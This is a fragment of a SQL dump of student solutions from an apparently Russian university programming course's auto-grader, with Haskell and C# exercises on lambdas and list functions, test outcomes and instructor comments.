(3858, 110, '2562137', '2012-11-21 13:38:40', 1, 'using System;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Collections;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace AllDifferent\r\n\r\n{\r\n\r\n    class MainClass\r\n\r\n    {\r\n\r\n		public static int Find(IEnumerable<int> a, Predicate<int> cond, Func<int> err)\r\n\r\n		{\r\n\r\n			foreach (int x in a) if (cond(x)) return x;\r\n\r\n			return err();\r\n\r\n		}\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n        	int[] a = {3, 12, 4, 22, 15, 31, 4};\r\n\r\n        	int[] a2 = {3, 14, 4, 15, 4};\r\n\r\n\r\n\r\n        	int[] b = {33, 12, 24, 22, 15, 31, 14};\r\n\r\n        	int[] c = {33, 132, 24, 22, 215, 31, 64};\r\n\r\n\r\n\r\n        	Func<int[], int> find1 = arr => Find(arr, x => x > 20, () => {Console.WriteLine("Not found"); return 0;});\r\n\r\n        	Func<int[], int> find2 = arr => Find(arr, x => x < 10, () => {return Find(arr, x => x < 20, () => {return 20;});});\r\n\r\n\r\n\r\n        	Console.WriteLine(find1(a));\r\n\r\n        	Console.WriteLine(find1(a2));\r\n\r\n        	Console.WriteLine(find2(a) + ", " + find2(b) + ", " + find2(c));\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3859, 109, 'Deutsche', '2012-11-21 13:59:18', 2, '﻿// Задача 29.1 Чистяков П.П. 543 гр.\r\n\r\n  --- Это все же не совсем по условию, там же написано "не использовать ничего, кроме целых чисел и \r\n  --- лямбда выражений. А у вас еще строки. Те надо вместо строки тоже как-то использовать лямбда выражение.\r\nusing System;\r\n\r\n\r\n\r\nnamespace _29._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static void allDiffLists(int n, int k)\r\n\r\n        {\r\n\r\n            if (n < k) // чтобы не делать лишнего\r\n\r\n                Console.WriteLine("");\r\n\r\n            else\r\n\r\n                allDiffLists1(n, k, x => true, (string s) => { Console.Write(s); }, "");\r\n\r\n        }\r\n\r\n\r\n\r\n        public static void allDiffLists1(int n, int k, Func<int, bool> f, Action<string> g, string res)\r\n\r\n        {\r\n\r\n            if (k == 0)\r\n\r\n            {\r\n\r\n                g(res);\r\n\r\n                Console.WriteLine();\r\n\r\n                return;\r\n\r\n            }\r\n\r\n            for (int i = 1; i <= n; i++)\r\n\r\n            {\r\n\r\n                if (f(i))\r\n\r\n                {\r\n\r\n                    string res1 = res + i.ToString() + " ";\r\n\r\n                    allDiffLists1(n, k - 1, j => f(j) && (j != i), g, res1);\r\n\r\n                }\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            int n = 0, k = 0;\r\n\r\n            Console.WriteLine("Input n, k (at list one of them <0 for exit)");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.Write("Input n: ");\r\n\r\n            n = Convert.ToInt32(Console.ReadLine());\r\n\r\n            Console.Write("Input k: ");\r\n\r\n            k = Convert.ToInt32(Console.ReadLine());\r\n\r\n            Console.WriteLine();\r\n\r\n            while ((n >= 0) && (k >= 0))\r\n\r\n            {\r\n\r\n                Console.WriteLine("Result:");\r\n\r\n                allDiffLists(n, k);\r\n\r\n                Console.WriteLine();\r\n\r\n                Console.WriteLine("Input n, k (at list one of them <0 for exit)");\r\n\r\n                Console.Write("Input n: ");\r\n\r\n                n = Convert.ToInt32(Console.ReadLine());\r\n\r\n                Console.Write("Input k: ");\r\n\r\n                k = Convert.ToInt32(Console.ReadLine());\r\n\r\n                Console.WriteLine();\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3860, 101, 'jogrms', '2012-11-21 14:04:45', 1, 'data Expr a = Add (Expr a) (Expr a) | Mult (Expr a) (Expr a) | N a | X deriving Show\r\n\r\nsimplify e = snd $ simp e where\r\n    simp (Mult (N 0) r) = (True, N 0)\r\n    simp (Mult l (N 0)) = (True, N 0)\r\n    simp (Add l r) = (False, Add (simplify l) (simplify r))\r\n    simp (Mult l r) = let\r\n        (cl, el) = simp l\r\n        (cr, er) = simp r\r\n        in if cl || cr then simp (Mult el er) else (False, Mult el er)\r\n    simp f = (False, f)\r\n', '<br/>Тесты успешно пройдены!'),
(3861, 109, '472848', '2012-11-21 14:05:36', 1, 'partial class Program\r\n{\r\n  private static Action allDiffList(int n, int k, Predicate<int> pred, Action write)\r\n  {\r\n    if (k == 0) return () => { write(); Console.WriteLine(); };\r\n\r\n    return () =>\r\n      {\r\n        for (int i = 1; i <= n; ++i)\r\n        {\r\n          if (pred(i))\r\n          {\r\n            allDiffList(n, k - 1, x => pred(x) && x != i, () => { write(); Console.Write("{0} ", i); })();\r\n          }\r\n        }\r\n      };\r\n  }\r\n\r\n  public static void AllDiffList(int n, int k)\r\n  {\r\n    Action write = allDiffList(n, k, x => true, () => { });\r\n    write();\r\n  }\r\n\r\n  static void Main(string[] args)\r\n  {\r\n    AllDiffList(4, 3);\r\n  }\r\n}', '<br/>Тесты успешно пройдены!'),
(3862, 102, 'jogrms', '2012-11-21 14:11:07', 1, 'findMajor = hlp 0 where\r\n    hlp _ [] = Nothing\r\n    hlp s (x:xs) = if x > s + sum xs then Just x else hlp (s + x) xs', '<br/>Тесты успешно пройдены!'),
(3863, 101, '3742311', '2012-11-21 14:20:02', 0, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | X deriving Show\r\n\r\nsimplify X = X\r\nsimplify (N i) = N i\r\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\r\nsimplify (Mult e1 e2) = let (s1, s2) = ((simplify e1), (simplify e2)) in if s1 == (N 0) || s2 = (N 0) then (N 0) else (Mult s1 s2)', 'Не удалось вычислить выражение "simplify (Mult X (Mult X (N 0)))", проверьте правильность синтаксиса'),
(3864, 101, '3742311', '2012-11-21 14:21:35', 0, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | X deriving Show\r\n\r\nsimplify X = X\r\nsimplify (N i) = N i\r\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\r\nsimplify (Mult e1 e2) = let (s1, s2) = ((simplify e1), (simplify e2)) in if s1 == (N 0) || s2 == (N 0) then (N 0) else (Mult s1 s2)', 'Не удалось вычислить выражение "simplify (Mult X (Mult X (N 0)))", проверьте правильность синтаксиса'),
(3865, 100, '3742311', '2012-11-21 14:24:44', 2, '   --- Тут вы не то решение положили. А я не помню у вас эта задача решена или нет?\r\n   --- Если решена, положите пожалуйста правильно решение еще раз, и я его зачту\r\ndata Expr = N Integer | Add Expr Expr | Mult Expr Expr | X deriving Show\r\n\r\nsimplify X = X\r\nsimplify (N i) = (N i)\r\nsimplify (Add e1 e2) = (Add (simplify e1) (simplify e2))\r\nsimplify (Mult e1 e2) = let (s1, s2) = ((simplify e1), (simplify e2)) in if s1 == (N 0) || s2 == (N 0) then (N 0) else (Mult s1 s2)\r\n\r\n', 'Не удалось вычислить выражение "length (allDiffLists 3 3)", проверьте правильность синтаксиса'),
(3866, 101, '3742311', '2012-11-21 14:25:12', 0, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | X deriving Show\r\n\r\nsimplify X = X\r\nsimplify (N i) = (N i)\r\nsimplify (Add e1 e2) = (Add (simplify e1) (simplify e2))\r\nsimplify (Mult e1 e2) = let (s1, s2) = ((simplify e1), (simplify e2)) in if s1 == (N 0) || s2 == (N 0) then (N 0) else (Mult s1 s2)\r\n', 'Не удалось вычислить выражение "simplify (Mult X (Mult X (N 0)))", проверьте правильность синтаксиса');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(3867, 101, '3742311', '2012-11-21 14:31:44', 2, 'data Expr = N Integer | Add Expr Expr | Mult Expr Expr | X deriving Show\r\n\r\nsimplify X = (X)\r\nsimplify (N i) = (N i)\r\nsimplify (Add e1 e2) = (Add (simplify e1) (simplify e2))\r\nsimplify (Mult e1 e2) = let (s1, s2) = ((simplify e1), (simplify e2)) in if s1 == (N 0) || s2 == (N 0) then (N 0) else (Mult s1 s2)\r\n    --- ОК, но чтобы сравнивать выражения надо еще что-то дописать в deriving\r\n    --- Попробуйте исправить, пожалуйста', 'Не удалось вычислить выражение "simplify (Mult X (Mult X (N 0)))", проверьте правильность синтаксиса'),
(3868, 103, 'jogrms', '2012-11-21 14:45:22', 1, 'findInLists l f c = find (find l (x -> find x f c /= c) []) f c where\r\n    find [] f c = c\r\n    find (x:xs) f c\r\n        | f x = x\r\n        | otherwise = find xs f c', '<br/>Тесты успешно пройдены!'),
(3869, 104, 'jogrms', '2012-11-21 14:58:56', 1, 'doubleEven l = l >>= x -> if mod x 2 == 0 then [x,x] else [x]', '<br/>Тесты успешно пройдены!'),
(3870, 105, '397095', '2012-11-21 14:59:01', 1, 'cartesian xs ys = xs >>= (	 -> map (u -> (t, u)) ys)\r\n   --- ОК, но если бы еще map выразить через >>= то будет совсем по условию.  ', '<br/>Тесты успешно пройдены!'),
(3871, 110, 'Deutsche', '2012-11-21 14:59:51', 1, '﻿// Задача 29.2 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\nnamespace _29._2\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static int Find(Predicate<int> func, List<int> a, Func<int> err)\r\n\r\n        {\r\n\r\n            foreach (int x in a)\r\n\r\n            {\r\n\r\n                if (func(x))\r\n\r\n                {\r\n\r\n                    return (x);\r\n\r\n                }   \r\n\r\n            }\r\n\r\n            return err();\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Console.WriteLine("Find in arrays the element satisfying to a condition (<10).");\r\n\r\n            Console.WriteLine("If there''s no such element, find in arrays the element ");\r\n\r\n            Console.WriteLine("satisfying to a condition (<20) as failure continuation.");\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            List<int> arr1 = new List<int> { 1444, 222, 177, 12, 45, -23, 346, 36, -345, 457, 0, 345, -64 };\r\n\r\n            Console.WriteLine("Array #1:");\r\n\r\n            foreach (int x in arr1)\r\n\r\n                Console.Write(x + "  ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.Write("Result: ");\r\n\r\n            var res1 = Find(x => x < 10, arr1, () => { return Find(x => x < 20, arr1, () => { return 20; }); });\r\n\r\n            Console.WriteLine(res1);\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            List<int> arr2 = new List<int> { 34, 56, 35, 100, 34, 340, 31, 234, 3490 };\r\n\r\n            Console.WriteLine("Array #2:");\r\n\r\n            foreach (int x in arr2)\r\n\r\n                Console.Write(x + "  ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.Write("Result: ");\r\n\r\n            var res2 = Find(x => x < 10, arr2, () => { return Find(x => x < 20, arr2, () => { return 20; }); });\r\n\r\n            Console.WriteLine(res2);\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            List<int> arr3 = new List<int> { 22, 115, 311, 37, 24, 16, 69, 111, 37, 16, 23, 533};\r\n\r\n            Console.WriteLine("Array #3:");\r\n\r\n            foreach (int x in arr3)\r\n\r\n                Console.Write(x + "  ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.Write("Result: ");\r\n\r\n            var res3 = Find(x => x < 10, arr3, () => { return Find(x => x < 20, arr3, () => { return 20; }); });\r\n\r\n            Console.WriteLine(res3);\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            List<int> arr4 = new List<int> { 14, 22, -7, 12, 45, -23, 346, 36, -345, 457, 0, 345, -64 };\r\n\r\n            Console.WriteLine("Array #4:");\r\n\r\n            foreach (int x in arr4)\r\n\r\n                Console.Write(x + "  ");\r\n\r\n            Console.WriteLine();\r\n\r\n            Console.Write("Result: ");\r\n\r\n            var res4 = Find(x => x < 10, arr4, () => { return Find(x => x < 20, arr4, () => { return 20; }); });\r\n\r\n            Console.WriteLine(res4);\r\n\r\n            Console.WriteLine();\r\n\r\n\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3872, 104, '3742311', '2012-11-21 15:02:33', 1, 'doubleEven l = l>>=(x -> if (mod x 2) == 0 then [x, x] else [x])', '<br/>Тесты успешно пройдены!'),
(3873, 101, '397095', '2012-11-21 15:05:50', 1, 'data Expr = N Integer | X | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ninstance Eq Expr where\r\n	N n1 == N n2 = n1 == n2\r\n	_ == _ = False\r\n\r\nsimplify (N n) = N n\r\nsimplify X = X\r\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\r\nsimplify (Mult e1 e2) = \r\n	let\r\n		s1 = simplify e1\r\n		s2 = simplify e2\r\n	in\r\n		if (s1 == N 0 || s2 == N 0) then N 0 else Mult s1 s2', '<br/>Тесты успешно пройдены!'),
(3874, 105, 'jogrms', '2012-11-21 15:06:14', 1, 'cartesian a b =\r\n    a >>= (x ->\r\n    b >>= (y ->\r\n    [(x,y)]))\r\n  --- Ок, замечательно, и даже переносы правильно сделаны:)', '<br/>Тесты успешно пройдены!'),
(3875, 105, '3742311', '2012-11-21 15:07:52', 1, 'cartesian l1 l2 = l1>>=(x -> l2>>=(y -> [(x,y)]))', '<br/>Тесты успешно пройдены!'),
(3876, 100, '3607492', '2012-11-21 15:12:58', 1, 'diffs 0 a f= [[]]\r\ndiffs a b f = [x:xs|x<-[1..b],f x,xs<-diffs (a-1) b (z->f z && z/=x)]\r\n\r\nallDiffLists a b = diffs a b (x->True)', '<br/>Тесты успешно пройдены!'),
(3877, 102, '533223', '2012-11-21 15:15:43', 0, 'findMajor xs = find (		 -> (t > ((sum xs) - t))) xs\r\n\r\nfind cond [] = Nothing\r\nfins cond (x::xs) = if (cond x) then Just x\r\n                    else find cond xs', 'Не удалось вычислить выражение "findMajor [2,3,15,2,2,2]", проверьте правильность синтаксиса'),
(3878, 102, '3742311', '2012-11-21 15:17:56', 1, 'findMajor l = let (m, s) = (maximum l, sum l) in if m * 2 > s then (Just m) else Nothing', '<br/>Тесты успешно пройдены!'),
(3879, 100, '4837959', '2012-11-21 15:23:47', 2, '  --- Нет, ну это вы просто переписали задачу, которую мы уже разбирали..\r\n  --- Тут надо как бы перемешать allLists и allDifferent'' - те перебирать варианты, и сразу отсеивать\r\n  --- неподходящие, как только что-то повторяется.\r\n  --- Попробуйте как-тто так написать, пожалуйста\r\n\r\nallLists n 0 = [[]]\r\nallLists n k = [i:xs | xs <- allLists n (k - 1), i <- [1..n]]\r\n\r\nallDifferent xs = allDifferent'' xs (	 -> True)\r\nallDifferent'' [] _ = True\r\nallDifferent'' (x:xs) cond = if not (cond x)\r\n                            then False\r\n                            else allDifferent'' xs (	 -> cond t && t /= x)\r\n\r\nallDiffLists n 0 = [[]]\r\nallDiffLists n k = filter allDifferent (allLists n k)', '<br/>Тесты успешно пройдены!'),
(3880, 97, '383483', '2012-11-21 15:32:22', 1, 'checkBrackets (x:xs) = ff (x:xs) []\r\nff [] [] = True\r\nff [] (x:xs) = False\r\nff (x:xs) [] = ff xs [x]\r\nff (x:xs) (y:ys)\r\n	|((x == '')'') && (y == ''('')) = ff xs ys\r\n	|((x == '']'') && (y == ''['')) = ff xs ys\r\n	|otherwise = ff xs (x:y:ys)\r\n', '<br/>Тесты успешно пройдены!'),
(3881, 102, '533223', '2012-11-21 15:32:43', 1, 'findMajor xs = find (		-> (t > ((sum xs) - t))) xs\r\n\r\nfind _ [] = Nothing\r\nfind cond (x:xs) = if (cond x) then Just x\r\n                    else find cond xs', '<br/>Тесты успешно пройдены!'),
(3882, 100, '51559263', '2012-11-21 15:46:46', 1, 'allDiffLists1 _ 0 _ = [[]]\r\n\r\n\r\n\r\nallDiffLists1 n k cond = [ i : xs | i <- [1..n], cond i, xs <- allDiffLists1 n (k-1) (  t -> cond t && t /= i ) ]\r\n\r\n\r\n\r\nallDiffLists n k = allDiffLists1 n k (  t -> True )\r\n', '<br/>Тесты успешно пройдены!'),
(3883, 100, '383483', '2012-11-21 15:57:02', 1, 'allDiffLists n k = allDiffLists1 n k (	->True)\r\nallDiffLists1 n 0 cond = [[]] \r\nallDiffLists1 n k cond = [i:xs|i<-[1..n], cond i, xs<-allDiffLists1 n (k-1) (	->cond t && t/=i)]', '<br/>Тесты успешно пройдены!'),
(3884, 105, '533223', '2012-11-21 16:10:49', 0, 'cartesian [] _ = []\r\ncartesian x:xs ys = (cartesianRow x ys) ++ (cartesian xs ys)\r\ncartesianRow x y:ys = ( x, y ):( cartesianRow x ys )\r\ncartesianRow _ [] = []', 'Не удалось вычислить выражение "cartesian [1,2] [3,4]", проверьте правильность синтаксиса'),
(3885, 105, '533223', '2012-11-21 16:12:08', 1, 'cartesian [] _ = []\r\ncartesian (x:xs) ys = (cartesianRow x ys) ++ (cartesian xs ys)\r\ncartesianRow x (y:ys) = ( x, y ):( cartesianRow x ys )\r\ncartesianRow _ [] = []', '<br/>Тесты успешно пройдены!'),
(3886, 104, '51559263', '2012-11-21 16:25:14', 1, 'doubleEven xs = xs >>=  x -> if mod x 2 == 0\r\n\r\n                              then [x,x]\r\n\r\n							  else [x]\r\n', '<br/>Тесты успешно пройдены!'),
(3887, 101, '4837959', '2012-11-21 16:32:51', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n\r\nsimplify'' (Mult e2pr (N 0)) = N 0\r\n\r\nsimplify'' (Mult (N 0) expr) = N 0\r\n\r\nsimplify'' e = e\r\n\r\nsimplify (Add expr1 expr2) = Add (simplify expr1) (simplify expr2)\r\n\r\nsimplify (Mult expr1 expr2) = simplify'' $ Mult (simplify expr1) (simplify expr2)\r\n\r\nsimplify e = e\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3888, 105, '51559263', '2012-11-21 16:40:28', 1, 'cartesian xs ys = xs >>=  x -> zip ( map (  y -> x ) [1..(length ys)] ) ys\r\n', '<br/>Тесты успешно пройдены!'),
(3889, 102, '4837959', '2012-11-21 16:49:45', 0, 'import List\n\n\n\nfindMajor xs = findMajor'' xs (sum xs)\n\nfindMajor'' xs s = find (x -> x > s - x) xs\n\n\n', 'Не удалось вычислить выражение "findMajor [2,3,15,2,2,2]", проверьте правильность синтаксиса'),
(3890, 102, '4837959', '2012-11-21 16:50:43', 1, 'import Data.List\r\n\r\n\r\n\r\nfindMajor xs = findMajor'' xs (sum xs)\r\n\r\nfindMajor'' xs s = find (x -> x > s - x) xs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3891, 103, '383483', '2012-11-21 17:08:11', 0, 'findInLists (x:xs) cond err = find cond (foldr (++) [] (x:xs)) err\r\nfind cond [] err = err \r\nfind cond (x:xs) err = if cond x then x else find cond xs err   ', '<br/>Тесты успешно пройдены!'),
(3892, 103, '383483', '2012-11-21 17:15:51', 1, 'findInLists (x:[]) cond err = find cond x err\r\nfindInLists (x:xs) cond err = find cond x (findInLists xs cond err)\r\nfind cond [] err = err \r\nfind cond (x:xs) err = if cond x then x else find cond xs err    ', '<br/>Тесты успешно пройдены!'),
(3893, 103, '4837959', '2012-11-21 17:17:09', 1, 'find cond [] err = err\r\n\r\nfind cond (x:xs) err = if cond x then x\r\n\r\n                       else find cond xs err\r\n\r\n\r\n\r\nfindInLists [] cond err = err\r\n\r\nfindInLists (xs:xss) cond err = find cond xs (findInLists xss cond err)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3894, 104, '4837959', '2012-11-21 17:19:20', 1, 'doubleEven xs = xs >>= x -> if mod x 2 == 0 then [x, x]\r\n\r\n                             else [x]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3895, 105, '4837959', '2012-11-21 17:28:13', 1, 'cartesian xs ys = xs >>= x -> map (y -> (x, y)) ys\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3896, 105, '383483', '2012-11-21 17:30:24', 2, 'cartesian xs ys = xs >>= (	->zip (map (m->t) [1..(length ys)]) ys) \r\n  --- Екатерина, я тут обратил внимание, что у вас решение довольно необычное и в то же время точно такое же, как\r\n  --- еще у одного человка. Если это случайное совпадение (это вполне возможно), \r\n  --- просто пришлите это решение еще раз, пожалуйста, и я вам зачту.\r\n', '<br/>Тесты успешно пройдены!'),
(3897, 103, '397095', '2012-11-21 17:42:05', 1, 'find cond [] err = err \r\nfind cond (x:xs) err = if cond x then x else find cond xs err\r\n\r\nfindInLists [] _ def = def\r\nfindInLists (x:xs) cond def = find cond x (findInLists xs cond def)', '<br/>Тесты успешно пройдены!'),
(3898, 105, '550896', '2012-11-21 17:48:38', 1, 'cartesian :: [Int] -> [Int] -> [(Int, Int)]\r\ncartesian a0 a1 | null a0 || null a1 = []\r\ncartesian a0 a1 = (cartesian0 (head a0) a1) ++ (cartesian (tail a0) a1)\r\n\r\n\r\ncartesian0 :: Int -> [Int] -> [(Int, Int)]\r\ncartesian0 a0 [] = []\r\ncartesian0 a0 a = [(a0, head a)] ++ (cartesian0 a0 (tail a))', '<br/>Тесты успешно пройдены!'),
(3899, 104, '550896', '2012-11-21 18:04:25', 1, 'doubleEven :: [Int] -> [Int]\r\ndoubleEven [] = []\r\ndoubleEven a = a >>= (x -> if (mod x 2 == 0) then [x, x] else [x]) ', '<br/>Тесты успешно пройдены!'),
(3900, 103, '550896', '2012-11-21 18:23:15', 0, 'find :: (a -> Bool) -> [a] -> Maybe a\r\nfind p =  listToMaybe . filter p\r\n\r\nfindInLists :: [[Int]] -> (Int -> Bool) -> Int -> Int\r\nfindInLists [] f a0 = a0\r\nfindInLists a f a0 | (find f (head a)) == Nothing = findInLists (tail a) f a0\r\nfindInLists a f a0 = fromMaybe a0 (find f (head a))\r\n\r\n\r\nfromMaybe :: Int -> Maybe Int -> Int\r\nfromMaybe a Nothing = a\r\nfromMaybe a (Just a0) = a0', 'Не удалось вычислить выражение "findInLists [[1,2], [2,8,7]] (>5) 0", проверьте правильность синтаксиса'),
(3901, 105, '17107004', '2012-11-21 18:23:17', 1, '\r\ncartesian l1 l2 = l1 >>= ( x -> l2 >>= ( y -> [(x,y)]))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3902, 103, '550896', '2012-11-21 18:24:18', 2, 'findInLists :: [[Int]] -> (Int -> Bool) -> Int -> Int\r\nfindInLists [] f a0 = a0\r\nfindInLists a f a0 | (find f (head a)) == Nothing = findInLists (tail a) f a0\r\nfindInLists a f a0 = getValue a0 (find f (head a))\r\n\r\n\r\ngetValue :: Int -> Maybe Int -> Int\r\ngetValue a Nothing = a\r\ngetValue a (Just a0) = a0\r\n   --- Нет, тут надо обязательно использовать именно тот find, который был на зянятиях', 'Не удалось вычислить выражение "findInLists [[1,2], [2,8,7]] (>5) 0", проверьте правильность синтаксиса'),
(3903, 100, '3431532', '2012-11-21 18:25:36', 1, 'allList 0 x cond = [[]]\r\nallList l x cond = [a:xs | a<-[1..x], cond a, xs<-allList (l-1) x (	 -> (cond t) && t /= a)]\r\n\r\nallDiffLists a b = (allList a b (	 -> True))', '<br/>Тесты успешно пройдены!'),
(3904, 107, '787463', '2012-11-21 18:27:42', 1, 'data LogExpr = X | T | F | And LogExpr LogExpr | Or LogExpr LogExpr | Not LogExpr\r\n\r\n\r\n\r\nsimplify (And c1 c2) =\r\n\r\n    let\r\n\r\n      (sc1, flag1) = simplify c1\r\n\r\n      (sc2, flag2) = simplify c2\r\n\r\n    in if sc1 == F || sc2 == F\r\n\r\n       then (F, True)\r\n\r\n       else if sc1 == T\r\n\r\n            then (sc2, True)\r\n\r\n            else if sc2 == T\r\n\r\n                 then (sc1, True)\r\n\r\n                 else if sc1 == Not sc2 || Not sc1 == sc2\r\n\r\n                      then (F, True)\r\n\r\n                      else if sc1 == sc2\r\n\r\n                           then (sc1, True)\r\n\r\n                           else (And sc1 sc2, flag1 || flag2)\r\n\r\nsimplify (Or d1 d2) =\r\n\r\n    let\r\n\r\n      (sd1, flag1) = simplify d1\r\n\r\n      (sd2, flag2) = simplify d2\r\n\r\n    in if sd1 == T || sd2 == T\r\n\r\n       then (T, True)\r\n\r\n       else if sd1 == F\r\n\r\n            then (sd2, True)\r\n\r\n            else if sd2 == F\r\n\r\n                 then (sd1, True)\r\n\r\n                 else if sd1 == Not sd2 || Not sd1 == sd2\r\n\r\n                      then (T, True)\r\n\r\n                      else if sd1 == sd2\r\n\r\n                           then (sd1, True)\r\n\r\n                           else (Or sd1 sd2, flag1 || flag2)\r\n\r\nsimplify (Not (Not le)) = (le, True)\r\n\r\nsimplify (Not (And le1 le2)) = (Or (Not le1) (Not le2), True)\r\n\r\nsimplify (Not (Or le1 le2)) = (And (Not le1) (Not le2), True)\r\n\r\nsimplify (Not T) = (F, True)\r\n\r\nsimplify (Not F) = (T, True)\r\n\r\nsimplify e = (e, False)\r\n\r\n\r\n\r\ninstance Eq LogExpr where\r\n\r\n    X == X = True\r\n\r\n    T == T = True\r\n\r\n    F == F = True\r\n\r\n    (Not le1) == (Not le2) = le1 == le2\r\n\r\n    (And le1 le2) == (And le3 le4) = le1 == le3 && le2 == le4\r\n\r\n    (Or le1 le2) == (Or le3 le4) = le1 == le3 && le2 == le4\r\n\r\n    le1 == le2 = \r\n\r\n        let\r\n\r\n          (sle1, flag1) = simplify le1\r\n\r\n          (sle2, flag2) = simplify le2\r\n\r\n        in if not (flag1 || flag2) then False else sle1 == sle2\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3905, 108, '787463', '2012-11-21 18:28:40', 0, 'queens'' _ 0 = [([], \\_ _ -> False)]\r\nqueens'' n k = [ ( (k, i):xs, a b -> check a b || b == i || abs (a - k) == abs (b - i)) | i <- [1..n], (xs, check) <- queens'' n (k - 1), not (check k i)]\r\n\r\nqueens n k = map ((xs, check) -> xs) (queens'' n k)', 'Не удалось вычислить выражение "length (queens 8 8)", проверьте правильность синтаксиса'),
(3906, 102, '550896', '2012-11-21 18:30:51', 1, 'findMajor :: [Int] -> Maybe Int\r\nfindMajor a = findMajor0 a (sum a)\r\n\r\nfindMajor0 :: [Int] -> Int -> Maybe Int\r\nfindMajor0 [] a0 = Nothing \r\nfindMajor0 a a0 | (head a) > (a0 - (head a)) = Just (head a)\r\nfindMajor0 a a0 = findMajor0 (tail a) a0\r\n', '<br/>Тесты успешно пройдены!'),
(3907, 100, '397095', '2012-11-21 18:32:48', 1, 'allDiffLists n k = adf n k (	 -> True)\r\n\r\nadf _ 0 _ = [[]]\r\nadf n k cond = [ (x:xs) | x <- [1..n], cond x, xs <- adf n (k-1) (	 -> cond t && t /= x) ]', '<br/>Тесты успешно пройдены!'),
(3908, 101, '419046', '2012-11-21 18:40:47', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving (Show,Eq)\r\n\r\nsimpl (Mult e1 e2) = if (e1 == (N 0))||(e2 == (N 0))  then (N 0)\r\n\r\n                     else (Mult e1 e2)\r\n\r\nsimplify (Add e1 e2) = Add (simplify e1) (simplify e2)\r\n\r\nsimplify X = X\r\n\r\nsimplify (N x) = (N x)\r\n\r\nsimplify (Mult e1 e2) = simpl (Mult (simplify e1) (simplify e2))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3909, 101, '550896', '2012-11-21 18:54:12', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\n\r\n--27.2\r\nsimplify :: Expr -> Expr\r\nsimplify (Mult e (N 0)) = N 0\r\nsimplify (Mult (N 0) e) = N 0\r\nsimplify (Mult e0 e1) | canbe (e0) || canbe(e1) = simplify (Mult (simplify e0) (simplify e1))\r\nsimplify (Add e0 e1) | canbe (e0) || canbe (e1) = simplify (Add (simplify e0) (simplify e1))\r\nsimplify (Mult e0 e1) = Mult (simplify e0) (simplify e1)\r\nsimplify (Add e0 e1) = Add (simplify e0) (simplify e1)\r\nsimplify e = e\r\n\r\ncanbe :: Expr -> Bool \r\ncanbe (Mult e (N 0)) = True\r\ncanbe (Mult (N 0) e) = True\r\ncanbe (Mult e0 e1) = canbe e0 || canbe e1\r\ncanbe (Add e0 e1) = canbe e0 || canbe e1\r\ncanbe e = False', '<br/>Тесты успешно пройдены!'),
(3910, 100, '318210', '2012-11-21 18:55:21', 1, 'allNondivisible xs = ch xs (\\_->True) \r\n	where \r\n		ch [] func = True \r\n	        ch (x:xs) func \r\n			 | not (func x) = False  \r\n			 | otherwise = ch xs (	 -> (func t) && ((max t x) `mod` (min t x) /= 0))\r\n\r\nallDiffLists n k = f n k (\\_ -> True)\r\n	where \r\n		f n 0 cond = [[]]\r\n		f n l cond = [i:xs | i <- [1..n], cond i, xs <- f n (l-1) (	 -> (cond t) && (t /= i) )]', '<br/>Тесты успешно пройдены!'),
(3911, 108, '787463', '2012-11-21 18:56:37', 1, 'queens'' n 0 = [([], \\_ _ -> False)]\r\nqueens'' n k = [((k, i):xs, a b -> b == i || check a b || abs (a - k) == abs (b - i)) | (xs, check) <- queens'' n (k - 1), i <- [1..n], not (check k i)]\r\n\r\nqueens n k = map ((xs, _) -> xs) (queens'' n k)', '<br/>Тесты успешно пройдены!'),
